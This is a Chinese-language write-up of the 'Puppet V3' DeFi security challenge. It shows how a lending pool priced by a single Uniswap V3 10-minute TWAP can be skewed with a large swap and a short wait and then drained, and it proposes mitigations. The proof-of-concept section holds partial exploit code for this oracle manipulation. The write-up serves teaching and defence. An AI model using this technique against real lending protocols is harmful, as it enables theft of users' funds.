# Puppet V3 漏洞分析

## 1. 合约功能概述

`PuppetV3Pool` 再次升级：不再读取现货价，而是使用 Uniswap V3 的 **10 分钟 TWAP** 作为借贷 oracle。

**核心组件：**
- **PuppetV3Pool.sol**: 借贷池，按 V3 `consult` 计算 TWAP 报价
- **OracleLibrary**: 通过 `observe` 计算 `arithmeticMeanTick`
- **PuppetV3.t.sol**: 主网 fork 场景，要求在很短时间内借空池子

**业务流程：**
1. 调用 `calculateDepositOfWETHRequired(amount)` 获取所需 WETH 抵押
2. 价格通过 `OracleLibrary.consult(pool, 10 minutes)` 取得时间加权平均 tick
3. 用户批准 WETH 后可借出 DVT

---

## 2. 漏洞位置

### 漏洞代码（PuppetV3Pool.sol）

```solidity
uint32 public constant TWAP_PERIOD = 10 minutes;

function calculateDepositOfWETHRequired(uint256 amount) public view returns (uint256) {
    uint256 quote = _getOracleQuote(_toUint128(amount));
    // ⚠️ 抵押要求直接由 TWAP quote 决定
    return quote * DEPOSIT_FACTOR;
}

function _getOracleQuote(uint128 amount) private view returns (uint256) {
    // 从 secondsAgo=10分钟 到现在的平均 tick
    (int24 arithmeticMeanTick,) = OracleLibrary.consult({pool: address(uniswapV3Pool), secondsAgo: TWAP_PERIOD});

    // ⚠️ 再按平均 tick 报 DVT->WETH 价格
    return OracleLibrary.getQuoteAtTick({
        tick: arithmeticMeanTick,
        baseAmount: amount,
        baseToken: address(token),
        quoteToken: address(weth)
    });
}
```

### 漏洞本质

V3 不再是“纯 spot oracle”，但仍可被利用：

- 该池使用单一 V3 池的 TWAP，缺少外部锚定
- 在低深度/窄区间流动性条件下，可通过大额 swap 把 tick 推到极端
- 随后让短时间窗口内的平均值被显著拉偏，造成抵押要求失真

---

## 3. 漏洞原理分析

### 3.1 与 V1/V2 的差异

- V1/V2：直接操纵现货价，几乎即时生效
- V3：需要操纵 tick 并让操纵后的状态“进入 TWAP 窗口”

也就是说，攻击仍是 oracle manipulation，但对象从 spot 变成了 TWAP 统计过程。

### 3.2 关卡里的关键利用点

测试给了两个关键条件：

- 玩家只有 `110 DVT + 1 ETH`
- 断言要求 `block.timestamp - initialBlockTimestamp < 115`

解法利用 V3 swap 回调，在池内把价格推到极端后，`skip(114)` 让被操纵 tick 对 10 分钟 TWAP 产生足够影响，
再立刻借空池子。

### 3.3 攻击步骤

1. 部署攻击合约并转入玩家 DVT/ETH
2. 在 V3 池执行大额 swap，操纵 tick
3. 等待约 114 秒，让 TWAP 被拉偏
4. 将 ETH 包成 WETH，授权借贷池
5. 以被拉低的抵押要求借出 1,000,000 DVT 并转给 `recovery`

---

## 4. 修复方案

### 方案一：增强 oracle 鲁棒性（推荐）

- 使用更长 TWAP 窗口（并非绝对安全，但提高成本）
- 使用多源价格（多个池 + 外部喂价）做聚合
- 对“短时大偏移”加保护阈值

### 方案二：借贷风控叠加

- 单笔借款上限 / 总借款速率限制
- 价格突变时提高抵押率或暂停借款
- 引入健康度与清算机制，而非只看单次报价

### 方案三：流动性与市场完整性检查

- 检查 oracle 池的有效流动性
- 当流动性不足或 tick 波动异常时拒绝借款

---

## 5. Proof of Concept（关键代码）

```solidity
function test_puppetV3() public checkSolvedByPlayer {
    // 1) 攻击合约持有玩家 ETH（后续可包装成 WETH）
    PuppetV3Attacker attacker = new PuppetV3Attacker{value: PLAYER_INITIAL_ETH_BALANCE}(token, weth, lendingPool, recovery);

    // 2) 转入玩家 DVT，用于 V3 池价格操纵
    token.transfer(address(attacker), PLAYER_INITIAL_TOKEN_BALANCE);
    attacker.manipulatePrice();

    // 3) 等待短时间，让操纵后的 tick 进入 10 分钟 TWAP
    skip(114);

    // 4) 以扭曲后的 TWAP 计算抵押并借空池子
    attacker.borrowAndRecover();
}

function manipulatePrice() external {
    uint256 tokenBalance = token.balanceOf(address(this));

    // 通过 V3 swap 把价格推向边界（方向由 token/weth 排序决定）
    uniswapPool.swap({
        recipient: address(this),
        zeroForOne: tokenIsToken0,
        amountSpecified: int256(tokenBalance),
        sqrtPriceLimitX96: tokenIsToken0 ? MIN_SQRT_RATIO_PLUS_ONE : MAX_SQRT_RATIO_MINUS_ONE,
        data: bytes("")
    });
}
```

---

## 6. 总结

`Puppet V3` 说明：把 spot 换成 TWAP 并不等于彻底安全。

如果 TWAP 窗口、流动性深度与风控机制设计不足，攻击者仍可能通过短时但强烈的价格冲击影响 oracle，
最终让借贷池以失真价格放贷。
